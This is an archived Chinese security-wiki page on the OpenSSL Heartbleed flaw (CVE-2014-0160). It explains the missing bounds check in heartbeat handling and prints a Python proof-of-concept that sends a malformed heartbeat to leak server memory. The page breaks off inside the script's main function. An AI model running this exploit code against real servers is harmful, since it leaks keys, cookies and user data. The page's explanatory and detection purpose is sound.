<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh"
  lang="zh" dir="ltr" class="no-js">

<!-- Mirrored from wiki.wooyun.org/server:openssl by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 02:53:26 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <title>server:openssl [WooYun WiKi]</title>
  <script>(function(H){H.className=H.className.replace(/\bno-js\b/,'js')})(document.documentElement)</script>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <link rel="shortcut icon" href="lib/tpl/bootstrap3/images/favicon.ico" />
<link rel="apple-touch-icon" href="lib/tpl/bootstrap3/images/apple-touch-icon.png" />
      <link type="text/css" rel="stylesheet" href="lib/tpl/bootstrap3/assets/bootstrap/css/bootstrap.min.css" />
    <script type="text/javascript">/*<![CDATA[*/
    var TPL_CONFIG = {"tableFullWidth":1};
  /*!]]>*/</script>
  <meta name="generator" content="DokuWiki"/>
<meta name="robots" content="noindex,nofollow"/>
<meta name="keywords" content="server,openssl"/>
<link rel="search" type="application/opensearchdescription+xml" href="http://wiki.wooyun.org/lib/exe/opensearch.php" title="WooYun WiKi"/>
<link rel="start" href="http://wiki.wooyun.org/"/>
<link rel="contents" href="http://wiki.wooyun.org/server:openssl?do=index" title="网站地图"/>
<link rel="alternate" type="application/rss+xml" title="最近更改" href="http://wiki.wooyun.org/feed.php"/>
<link rel="alternate" type="application/rss+xml" title="当前命名空间" href="http://wiki.wooyun.org/feed.php?mode=list&amp;ns=server"/>
<link rel="alternate" type="text/html" title="纯HTML" href="http://wiki.wooyun.org/_export/xhtml/server:openssl"/>
<link rel="alternate" type="text/plain" title="Wiki Markup 语言" href="http://wiki.wooyun.org/_export/raw/server:openssl"/>
<link rel="stylesheet" type="text/css" href="http://wiki.wooyun.org/lib/exe/css.php?t=bootstrap3&amp;tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"/>
<script type="text/javascript">/*<![CDATA[*/var NS='server';var JSINFO = {"id":"server:openssl","namespace":"server","plugin_codeprettify":{"loader_base":"\/lib\/plugins\/codeprettify\/google-code-prettify"}};
/*!]]>*/</script>
<script type="text/javascript" charset="utf-8" src="http://wiki.wooyun.org/lib/exe/js.php?tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"></script>
<script type="text/javascript" charset="utf-8" src="http://wiki.wooyun.org/lib/plugins/codeprettify/google-code-prettify/run_prettify.js?lang=css"></script>
  <script type="text/javascript" src="http://wiki.wooyun.org/lib/tpl/bootstrap3/assets/bootstrap/js/bootstrap.min.js"></script>
  <style type="text/css">
    body { padding-top: 20px; }
  </style>
  <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script type="text/javascript" src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
  <script type="text/javascript" src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->
</head>
<body class="default page-on-panel">
  <!--[if lte IE 7 ]><div id="IE7"><![endif]--><!--[if IE 8 ]><div id="IE8"><![endif]-->

  <div id="dokuwiki__site" class="container">
    <div id="dokuwiki__top" class="site dokuwiki mode_show tpl_bootstrap3    hasSidebar">

      
      <!-- header -->
      <div id="dokuwiki__header">
        <nav class="navbar  navbar-default" role="navigation">

  <div class="container-fluid">

    <div class="navbar-header">

      <button class="navbar-toggle" type="button" data-toggle="collapse" data-target=".navbar-collapse">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>

      <a href="http://wiki.wooyun.org/WooYun WiKi"  accesskey="h" title="[H]" class="navbar-brand"><img src="http://wiki.wooyun.org/lib/tpl/bootstrap3/images/logo.png" alt="WooYun WiKi" class="pull-left" id="dw__logo" width="20" height="20" /> <span id="dw__title" >WooYun WiKi</span></a>
    </div>

    <div class="collapse navbar-collapse">

      <ul class="nav navbar-nav" id="dw__navbar">
        <li class="active">
  <a href="http://wiki.wooyun.org/WooYun WiKi" ><i class="glyphicon glyphicon-home"></i> Home</a></li>
      </ul>

      <div class="navbar-right">

        <form action="http://wiki.wooyun.org/WooYun WiKi" accept-charset="utf-8" class="search" id="dw__search" method="get" role="search"><div class="no"><input type="hidden" name="do" value="search" /><input type="text" id="qsearch__in" accesskey="f" name="id" class="edit" title="[F]" /><input type="submit" value="搜索" class="button" title="搜索" /><div id="qsearch__out" class="ajax_qsearch JSpopup"></div></div></form>
        <ul class="nav navbar-nav" id="dw__tools">
  <li class="dropdown">
    <a href="#" class="dropdown-toggle" data-toggle="dropdown" title="工具"><i class="glyphicon glyphicon-wrench"></i> <span class="hidden-lg hidden-md hidden-sm">工具</span> <span class="caret"></span></a>
    <ul class="dropdown-menu tools" role="menu">

      <!-- dokuwiki__usertools -->
      <li class="dropdown-header"><i class="glyphicon glyphicon-user"></i> 用户工具</li>
      
      <li class="divider"></li>

      <!-- dokuwiki__sitetools -->
      <li class="dropdown-header"><i class="glyphicon glyphicon-cog"></i> 站点工具</li>
      <li><a href="http://wiki.wooyun.org/server:openssl?do=recent"  class="action recent" accesskey="r" rel="nofollow" title="最近更改 [R]"><i class="glyphicon glyphicon-list-alt"></i> 最近更改</a></li><li><a href="http://wiki.wooyun.org/server:openssl?do=media&amp;ns=server"  class="action media" rel="nofollow" title="媒体管理器"><i class="glyphicon glyphicon-picture"></i> 媒体管理器</a></li><li><a href="http://wiki.wooyun.org/server:openssl?do=index"  class="action index" accesskey="x" rel="nofollow" title="网站地图 [X]"><i class="glyphicon glyphicon-list"></i> 网站地图</a></li>
      <li class="divider"></li>

      <!-- dokuwiki__pagetools -->
      <li class="dropdown-header"><i class="glyphicon glyphicon-file"></i> 页面工具</li>
      <li><a href="http://wiki.wooyun.org/server:openssl?do=edit&amp;rev=1432027696"  class="action source" accesskey="v" rel="nofollow" title="显示源文件 [V]"><i class="glyphicon glyphicon-edit"></i> 显示源文件</a></li><li><a href="http://wiki.wooyun.org/server:openssl?do=revisions"  class="action revs" accesskey="o" rel="nofollow" title="修订记录 [O]"><i class="glyphicon glyphicon-time"></i> 修订记录</a></li><li><a href="http://wiki.wooyun.org/server:openssl?do=backlink"  class="action backlink" rel="nofollow" title="反向链接"><i class="glyphicon glyphicon-link"></i> 反向链接</a></li><li><a href="#dokuwiki__top"  class="action top" accesskey="t" rel="nofollow" title="回到顶部 [T]"><i class="glyphicon glyphicon-chevron-up"></i> 回到顶部</a></li>
    </ul>
  </li>
</ul>

        <ul class="nav navbar-nav">
          <li>
                      </li>
                    <li><a href="http://wiki.wooyun.org/server:openssl?do=login&amp;sectok=a3845e1693337b10c6abaa01a16b0594"  class="action login" rel="nofollow" title="登录"><i class="glyphicon glyphicon-log-in"></i> 登录</a></li>        </ul>

      </div>

    </div>
  </div>
</nav>
      </div>
      <!-- /header -->

      
            <div id="dw__breadcrumbs">
        <hr/>
                        <div class="breadcrumb hidden-print"><span class="bchead">您的足迹:</span> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:elasticsearch"  class="breadcrumbs" title="server:elasticsearch">elasticsearch</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:file-disclosure"  class="breadcrumbs" title="server:file-disclosure">file-disclosure</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:httpput"  class="breadcrumbs" title="server:httpput">httpput</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:resolve"  class="breadcrumbs" title="server:resolve">resolve</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:directory-list"  class="breadcrumbs" title="server:directory-list">directory-list</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:padding-oracle-attack"  class="breadcrumbs" title="server:padding-oracle-attack">padding-oracle-attack</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:host"  class="breadcrumbs" title="server:host">host</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:zone-transfer"  class="breadcrumbs" title="server:zone-transfer">zone-transfer</a></bdi> <span class="bcsep">•</span> <bdi><a href="http://wiki.wooyun.org/server:squid"  class="breadcrumbs" title="server:squid">squid</a></bdi> <span class="bcsep">•</span> <span class="curid"><bdi><a href="http://wiki.wooyun.org/server:openssl"  class="breadcrumbs" title="server:openssl">openssl</a></bdi></span></div>
                <hr/>
      </div>
      
      <p class="pageId text-right">
        <span class="label label-default">server:openssl</span>
      </p>

      <div id="dw__msgarea">
              </div>

      <main class="main row" role="main">

        <!-- ********** ASIDE ********** -->
<aside id="dokuwiki__aside" class="dw__sidebar col-sm-3 col-md-2 hidden-print">
  <div class="content">
    <div class="toogle hidden-lg hidden-md hidden-sm" data-toggle="collapse" data-target="#dokuwiki__aside .collapse">
      <i class="glyphicon glyphicon-th-list"></i> 侧边栏    </div>
    <div class="collapse in">
            
<h4 id="企业安全">企业安全</h4>
<div class="level4">
<ul>
<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/enterprise:information" class="wikilink1" title="enterprise:information">信息收集</a></div>
</li>
<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/enterprise:server" class="wikilink1" title="enterprise:server">服务配置</a></div>
</li>
<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/enterprise:web" class="wikilink1" title="enterprise:web">Web应用</a></div>
</li>
<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/enterprise:tools" class="wikilink1" title="enterprise:tools">安全工具</a></div>
</li>
<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/enterprise:defence" class="wikilink1" title="enterprise:defence">安全防御</a></div>
</li>
<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/enterprise:pentest" class="wikilink1" title="enterprise:pentest">渗透技巧</a></div>
</li>
</ul>

</div>

<h4 id="android_安全">Android 安全</h4>
<div class="level4">
<ul>
<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/android:client" class="wikilink1" title="android:client">客户端</a></div>
</li>
<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/android:system" class="wikilink1" title="android:system">系统</a></div>
</li>
<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/android:communicate" class="wikilink1" title="android:communicate">通信</a></div>
</li>
<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/android:server" class="wikilink1" title="android:server">服务端</a></div>
</li>
<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/android:tools" class="wikilink1" title="android:tools">常用工具</a></div>
</li>
</ul>

</div>

<h4 id="乌云">乌云</h4>
<div class="level4">
<ul>
<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/wooyun:route" class="wikilink1" title="wooyun:route">乌云路由</a></div>
</li>
<li class="level1"><div class="li"><span class="curid"><a href="http://wiki.wooyun.org/wooyun:woobuntu" class="wikilink1" title="wooyun:woobuntu">Woobuntu</a></span></div>
</li>
</ul>

</div>

<h4 id="apt">APT</h4>
<div class="level4">
<ul>
<li class="level1"><div class="li"><a href="http://wiki.wooyun.org/apt:organization" class="wikilink1" title="apt:organization">组织</a></div>
</li>
</ul>

</div>

<h4 id="find_us">Find Us</h4>
<div class="level4">
<ul>
<li class="level1"><div class="li">Email: <a class="__cf_email__" href="http://wiki.wooyun.org/cdn-cgi/l/email-protection" data-cfemail="66110f0d0f261109091f130848091401">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">
/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("data-cfhash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}t.parentNode.removeChild(t);}}catch(u){}}()/* ]]> */</script>
</div>
</li>
</ul>

</div>
          </div>
  </div>
</aside>

        <!-- ********** CONTENT ********** -->
        <article id="dokuwiki__content" class="col-sm-9 col-md-10" >

          <div class="panel panel-default" > 
            <div class="page group panel-body">

                                          
              <div class="pull-right hidden-print" data-spy="affix" data-offset-top="150" style="z-index:1024; top:10px; right:10px;">
                <!-- TOC START -->
<div id="dw__toc">
<h3 class="toggle">目录</h3>
<div>

<ul class="toc">
<li class="level1"><div class="li"><a href="#心脏出血_heart_bleed_漏洞">心脏出血（heart bleed）漏洞</a></div>
<ul class="toc">
<li class="clear">
<ul class="toc">
<li class="level3"><div class="li"><a href="#漏洞简介">1、漏洞简介</a></div></li>
<li class="level3"><div class="li"><a href="#漏洞成因">2、漏洞成因</a></div></li>
<li class="level3"><div class="li"><a href="#漏洞检测及利用">3、漏洞检测及利用</a></div></li>
<li class="level3"><div class="li"><a href="#影响范围">4、影响范围</a></div></li>
<li class="level3"><div class="li"><a href="#实际案例">5、实际案例</a></div></li>
<li class="level3"><div class="li"><a href="#漏洞修复">6、漏洞修复</a></div></li>
<li class="level3"><div class="li"><a href="#相关资源">7、相关资源</a></div></li>
</ul></li>
</ul></li>
</ul>
</div>
</div>
<!-- TOC END -->
              </div>

              <!-- wikipage start -->
              
<p>
﻿
</p>

<h1 class="sectionedit1" id="心脏出血_heart_bleed_漏洞">心脏出血（heart bleed）漏洞</h1>
<div class="level1">

</div>

<h3 class="sectionedit2" id="漏洞简介">1、漏洞简介</h3>
<div class="level3">
<hr />

<p>
OpenSSL 是一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及SSL协议，并提供丰富的应用程序供测试或其它目的使用。
</p>

<p>
2014年4月7日OpenSSL的Heartbleed漏洞被曝光，该漏洞破坏性之大和影响的范围之广，堪称网络安全里程碑事件。
</p>

<p>
该漏洞可读取服务器上内存中随机64KB数据，可能导致服务器内重要的敏感信息（如用户cookie，服务器秘钥）等泄露。
</p>

</div>

<h3 class="sectionedit3" id="漏洞成因">2、漏洞成因</h3>
<div class="level3">
<hr />

<p>
当使用基于openssl通信的双方建立安全连接后，客户端需要不断的发送心跳信息到服务器，以确保服务器是可用的。
</p>

<p>
基本的流程是：客户端发送一段固定长度的字符串到服务器，服务器接收后，返回该固定长度的字符串。比如客户端发送“hello,world”字符串到服务器，服务器接受后，原样返回“hello,world”字符串，这样客户端就会认为openssl服务器是可用的。
</p>

<p>
客户端发送的心跳信息结构体定义为：
</p>
<pre class="code c"><span class="kw4">struct</span> hb <span class="br0">&#123;</span>
      <span class="kw4">int</span> type<span class="sy0">;</span>
      <span class="kw4">int</span> length<span class="sy0">;</span>
      <span class="kw4">unsigned</span> <span class="kw4">char</span> <span class="sy0">*</span>data<span class="sy0">;</span>                                                    
<span class="br0">&#125;</span><span class="sy0">;</span></pre>

<p>
其中type为心跳的类型，length为data的大小。
</p>

<p>
其中关于data字段的内容结构为：
</p>
<ul>
<li class="level1"><div class="li">type字段占一个字节，payload字段占两个字节，其余的为payload的具体内容。</div>
</li>
</ul>

<p>
详情如下所示：
</p>
<pre class="code">字节序号        备注

0                 type

1-2              data中具体的内容的大小为payload

3-len            具体的内容pl      </pre>

<p>
当服务器收到消息后，会对该消息进行解析，也就是对data中的字符串进行解析，通过解析第0位得到type，第1-2位得到payload，接着申请(1+2+payload)大小的内存，然后再将相应的数据拷贝到该新申请的内存中。
</p>

<p>
假如客户端发送的data数据为“006abcdef”，那么服务器端解析可以得到type=0, payload=06, pl=&#039;abcdef&#039;，申请(1+2+6=9)大小的内存，然后再将type, payload, pl写到新申请的内存中。
</p>

<p>
但在存在漏洞的OpenSSL代码中包括TLS(TCP)和DTLS(UDP)都没有做边界的检测。服务器会按照payload的大小申请内存并将内存中的数据发回给客户端。
导致攻击者可以利用这个漏洞来获得TLS链接对端（可以是服务器，也可以是客户端）内存中的一些数据，至少可以获得16KB每次，理论上讲最大可以获取64KB。
</p>

</div>

<h3 class="sectionedit4" id="漏洞检测及利用">3、漏洞检测及利用</h3>
<div class="level3">
<hr />

<p>
利用代码：
</p>
<pre class="code python"><span class="co1">#!/usr/bin/python</span>
&nbsp;
<span class="co1"># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (<a class="__cf_email__" href="http://wiki.wooyun.org/cdn-cgi/l/email-protection" data-cfemail="22485152474c45574b4c62485152474c45574b4c0c4d5045">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">
/* <![CDATA[ */!function(){try{var t="currentScript"in document?document.currentScript:function(){for(var t=document.getElementsByTagName("script"),e=t.length;e--;)if(t[e].getAttribute("data-cfhash"))return t[e]}();if(t&&t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute("data-cfemail");if(a){for(e="",r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}t.parentNode.removeChild(t);}}catch(u){}}()/* ]]> */</script>)</span>
<span class="co1"># The author disclaims copyright to this source code.</span>
&nbsp;
<span class="kw1">import</span> <span class="kw3">sys</span>
<span class="kw1">import</span> <span class="kw3">struct</span>
<span class="kw1">import</span> <span class="kw3">socket</span>
<span class="kw1">import</span> <span class="kw3">time</span>
<span class="kw1">import</span> <span class="kw3">select</span>
<span class="kw1">import</span> <span class="kw3">re</span>
<span class="kw1">from</span> <span class="kw3">optparse</span> <span class="kw1">import</span> OptionParser
&nbsp;
options <span class="sy0">=</span> OptionParser<span class="br0">&#40;</span>usage<span class="sy0">=</span><span class="st0">'%prog server [options]'</span><span class="sy0">,</span> description<span class="sy0">=</span><span class="st0">'Test for SSL heartbeat vulnerability (CVE-2014-0160)'</span><span class="br0">&#41;</span>
options.<span class="me1">add_option</span><span class="br0">&#40;</span><span class="st0">'-p'</span><span class="sy0">,</span> <span class="st0">'--port'</span><span class="sy0">,</span> <span class="kw2">type</span><span class="sy0">=</span><span class="st0">'int'</span><span class="sy0">,</span> default<span class="sy0">=</span><span class="nu0">443</span><span class="sy0">,</span> <span class="kw2">help</span><span class="sy0">=</span><span class="st0">'TCP port to test (default: 443)'</span><span class="br0">&#41;</span>
&nbsp;
<span class="kw1">def</span> h2bin<span class="br0">&#40;</span>x<span class="br0">&#41;</span>:
    <span class="kw1">return</span> x.<span class="me1">replace</span><span class="br0">&#40;</span><span class="st0">' '</span><span class="sy0">,</span> <span class="st0">''</span><span class="br0">&#41;</span>.<span class="me1">replace</span><span class="br0">&#40;</span><span class="st0">'<span class="es0">\n</span>'</span><span class="sy0">,</span> <span class="st0">''</span><span class="br0">&#41;</span>.<span class="me1">decode</span><span class="br0">&#40;</span><span class="st0">'hex'</span><span class="br0">&#41;</span>
&nbsp;
hello <span class="sy0">=</span> h2bin<span class="br0">&#40;</span><span class="st0">'''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
'''</span><span class="br0">&#41;</span>
&nbsp;
hb <span class="sy0">=</span> h2bin<span class="br0">&#40;</span><span class="st0">''' 
18 03 02 00 03
01 40 00
'''</span><span class="br0">&#41;</span>
&nbsp;
<span class="kw1">def</span> hexdump<span class="br0">&#40;</span>s<span class="br0">&#41;</span>:
    <span class="kw1">for</span> b <span class="kw1">in</span> <span class="kw2">xrange</span><span class="br0">&#40;</span><span class="nu0">0</span><span class="sy0">,</span> <span class="kw2">len</span><span class="br0">&#40;</span>s<span class="br0">&#41;</span><span class="sy0">,</span> <span class="nu0">16</span><span class="br0">&#41;</span>:
        lin <span class="sy0">=</span> <span class="br0">&#91;</span>c <span class="kw1">for</span> c <span class="kw1">in</span> s<span class="br0">&#91;</span>b : b + <span class="nu0">16</span><span class="br0">&#93;</span><span class="br0">&#93;</span>
        hxdat <span class="sy0">=</span> <span class="st0">' '</span>.<span class="me1">join</span><span class="br0">&#40;</span><span class="st0">'%02X'</span> % <span class="kw2">ord</span><span class="br0">&#40;</span>c<span class="br0">&#41;</span> <span class="kw1">for</span> c <span class="kw1">in</span> lin<span class="br0">&#41;</span>
        pdat <span class="sy0">=</span> <span class="st0">''</span>.<span class="me1">join</span><span class="br0">&#40;</span><span class="br0">&#40;</span>c <span class="kw1">if</span> <span class="nu0">32</span> <span class="sy0">&lt;=</span> <span class="kw2">ord</span><span class="br0">&#40;</span>c<span class="br0">&#41;</span> <span class="sy0">&lt;=</span> <span class="nu0">126</span> <span class="kw1">else</span> <span class="st0">'.'</span> <span class="br0">&#41;</span><span class="kw1">for</span> c <span class="kw1">in</span> lin<span class="br0">&#41;</span>
        <span class="kw1">print</span> <span class="st0">'  %04x: %-48s %s'</span> % <span class="br0">&#40;</span>b<span class="sy0">,</span> hxdat<span class="sy0">,</span> pdat<span class="br0">&#41;</span>
    <span class="kw1">print</span>
&nbsp;
<span class="kw1">def</span> recvall<span class="br0">&#40;</span>s<span class="sy0">,</span> length<span class="sy0">,</span> timeout<span class="sy0">=</span><span class="nu0">5</span><span class="br0">&#41;</span>:
    endtime <span class="sy0">=</span> <span class="kw3">time</span>.<span class="kw3">time</span><span class="br0">&#40;</span><span class="br0">&#41;</span> + timeout
    rdata <span class="sy0">=</span> <span class="st0">''</span>
    remain <span class="sy0">=</span> length
    <span class="kw1">while</span> remain <span class="sy0">&gt;</span> <span class="nu0">0</span>:
        rtime <span class="sy0">=</span> endtime - <span class="kw3">time</span>.<span class="kw3">time</span><span class="br0">&#40;</span><span class="br0">&#41;</span> 
        <span class="kw1">if</span> rtime <span class="sy0">&lt;</span> <span class="nu0">0</span>:
            <span class="kw1">return</span> <span class="kw2">None</span>
        r<span class="sy0">,</span> w<span class="sy0">,</span> e <span class="sy0">=</span> <span class="kw3">select</span>.<span class="kw3">select</span><span class="br0">&#40;</span><span class="br0">&#91;</span>s<span class="br0">&#93;</span><span class="sy0">,</span> <span class="br0">&#91;</span><span class="br0">&#93;</span><span class="sy0">,</span> <span class="br0">&#91;</span><span class="br0">&#93;</span><span class="sy0">,</span> <span class="nu0">5</span><span class="br0">&#41;</span>
        <span class="kw1">if</span> s <span class="kw1">in</span> r:
            data <span class="sy0">=</span> s.<span class="me1">recv</span><span class="br0">&#40;</span>remain<span class="br0">&#41;</span>
            <span class="co1"># EOF?</span>
            <span class="kw1">if</span> <span class="kw1">not</span> data:
                <span class="kw1">return</span> <span class="kw2">None</span>
            rdata +<span class="sy0">=</span> data
            remain -<span class="sy0">=</span> <span class="kw2">len</span><span class="br0">&#40;</span>data<span class="br0">&#41;</span>
    <span class="kw1">return</span> rdata
&nbsp;
&nbsp;
<span class="kw1">def</span> recvmsg<span class="br0">&#40;</span>s<span class="br0">&#41;</span>:
    hdr <span class="sy0">=</span> recvall<span class="br0">&#40;</span>s<span class="sy0">,</span> <span class="nu0">5</span><span class="br0">&#41;</span>
    <span class="kw1">if</span> hdr <span class="kw1">is</span> <span class="kw2">None</span>:
        <span class="kw1">print</span> <span class="st0">'Unexpected EOF receiving record header - server closed connection'</span>
        <span class="kw1">return</span> <span class="kw2">None</span><span class="sy0">,</span> <span class="kw2">None</span><span class="sy0">,</span> <span class="kw2">None</span>
    typ<span class="sy0">,</span> ver<span class="sy0">,</span> ln <span class="sy0">=</span> <span class="kw3">struct</span>.<span class="me1">unpack</span><span class="br0">&#40;</span><span class="st0">'&gt;BHH'</span><span class="sy0">,</span> hdr<span class="br0">&#41;</span>
    pay <span class="sy0">=</span> recvall<span class="br0">&#40;</span>s<span class="sy0">,</span> ln<span class="sy0">,</span> <span class="nu0">10</span><span class="br0">&#41;</span>
    <span class="kw1">if</span> pay <span class="kw1">is</span> <span class="kw2">None</span>:
        <span class="kw1">print</span> <span class="st0">'Unexpected EOF receiving record payload - server closed connection'</span>
        <span class="kw1">return</span> <span class="kw2">None</span><span class="sy0">,</span> <span class="kw2">None</span><span class="sy0">,</span> <span class="kw2">None</span>
    <span class="kw1">print</span> <span class="st0">' ... received message: type = %d, ver = %04x, length = %d'</span> % <span class="br0">&#40;</span>typ<span class="sy0">,</span> ver<span class="sy0">,</span> <span class="kw2">len</span><span class="br0">&#40;</span>pay<span class="br0">&#41;</span><span class="br0">&#41;</span>
    <span class="kw1">return</span> typ<span class="sy0">,</span> ver<span class="sy0">,</span> pay
&nbsp;
<span class="kw1">def</span> hit_hb<span class="br0">&#40;</span>s<span class="br0">&#41;</span>:
    s.<span class="me1">send</span><span class="br0">&#40;</span>hb<span class="br0">&#41;</span>
    <span class="kw1">while</span> <span class="kw2">True</span>:
        typ<span class="sy0">,</span> ver<span class="sy0">,</span> pay <span class="sy0">=</span> recvmsg<span class="br0">&#40;</span>s<span class="br0">&#41;</span>
        <span class="kw1">if</span> typ <span class="kw1">is</span> <span class="kw2">None</span>:
            <span class="kw1">print</span> <span class="st0">'No heartbeat response received, server likely not vulnerable'</span>
            <span class="kw1">return</span> <span class="kw2">False</span>
&nbsp;
        <span class="kw1">if</span> typ <span class="sy0">==</span> <span class="nu0">24</span>:
            <span class="kw1">print</span> <span class="st0">'Received heartbeat response:'</span>
            hexdump<span class="br0">&#40;</span>pay<span class="br0">&#41;</span>
            <span class="kw1">if</span> <span class="kw2">len</span><span class="br0">&#40;</span>pay<span class="br0">&#41;</span> <span class="sy0">&gt;</span> <span class="nu0">3</span>:
                <span class="kw1">print</span> <span class="st0">'WARNING: server returned more data than it should - server is vulnerable!'</span>
            <span class="kw1">else</span>:
                <span class="kw1">print</span> <span class="st0">'Server processed malformed heartbeat, but did not return any extra data.'</span>
            <span class="kw1">return</span> <span class="kw2">True</span>
&nbsp;
        <span class="kw1">if</span> typ <span class="sy0">==</span> <span class="nu0">21</span>:
            <span class="kw1">print</span> <span class="st0">'Received alert:'</span>
            hexdump<span class="br0">&#40;</span>pay<span class="br0">&#41;</span>
            <span class="kw1">print</span> <span class="st0">'Server returned error, likely not vulnerable'</span>
            <span class="kw1">return</span> <span class="kw2">False</span>
&nbsp;
<span class="kw1">def</span> main<span class="br0">&#40;</span><span class="br0">&#41;</span>:
    opts<span class="sy0">,</span> args <span class="sy0">=</span> options.<span class="me1">parse_args</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
    <span class="kw1">if</span> <span class="kw2">len</span><span class="br0">&#40;</span>args<span class="br0">&#41;</span> <span class="sy0">&lt;</span> <span class="nu0">1</span>:
        options.<span class="me1">print_help</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
        <span class="kw1">return</span>
&nbsp;
    s <span class="sy0">=</span> <span class="kw3">socket</span>.<span class="kw3">socket</span><span class="br0">&#40;</span><span class="kw3">socket</span>.<span class="me1">AF_INET</span><span class="sy0">,</span> <span class="kw3">socket</span>.<span class="me1">SOCK_STREAM</span><span class="br0">&#41;</span>
    <span class="kw1">print</span> <span class="st0">'Connecting...'</span>
    <span class="kw3">sys</span>.<span class="me1">stdout</span>.<span class="me1">flush</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
    s.<span class="me1">connect</span><span class="br0">&#40;</span><span class="br0">&#40;</span>args<span class="br0">&#91;</span><span class="nu0">0</span><span class="br0">&#93;</span><span class="sy0">,</span> opts.<span class="me1">port</span><span class="br0">&#41;</span><span class="br0">&#41;</span>
    <span class="kw1">print</span> <span class="st0">'Sending Client Hello...'</span>
    <span class="kw3">sys</span>.<span class="me1">stdout</span>.<span class="me1">flush</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
    s.<span class="me1">send</span><span class="br0">&#40;</span>hello<span class="br0">&#41;</span>
    <span class="kw1">print</span> <span class="st0">'Waiting for Server Hello...'</span>
    <span class="kw3">sys</span>.<span class="me1">stdout</span>.<span class="me1">flush</span><span class="br0">&#40;</span><span class="br0">&#41;</span>
    <span class="kw1">while</span> <span class="kw2">True</span>:
        typ<span class="sy0">,</span> ver<span class="sy0">,</span> pay <span class="sy0">=</span> recvmsg<span class="br0">&#40;</span>s<span class="br0">&#41;</span>
        <span class="kw1">if</span> typ <span class="sy0">==</span> <span class="kw2">None</span>:
            <span class="kw1">print</span> <span class="st0">'Server closed connection without sending Server Hello.'</span>
            <span class="kw1">return</span>
        <span class="co1"># Look for server hello done message.</span>
        <span class="kw1">if</span> typ <span class="sy0">==</span> <span class="nu0">22</span> <span class="kw1">and</span> <span class="kw2">ord</span><span class="br0">&#40;</span>pay<span class="br0">&#91;</span><span class="nu0">0</span><span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="sy0">==</span> <span class="nu0">0x0E</span>:
            <span class="kw1">break</span>
&nbsp;
    <span class="kw1">print</span> <span class="st0">'Sending heartbeat request...'</span>
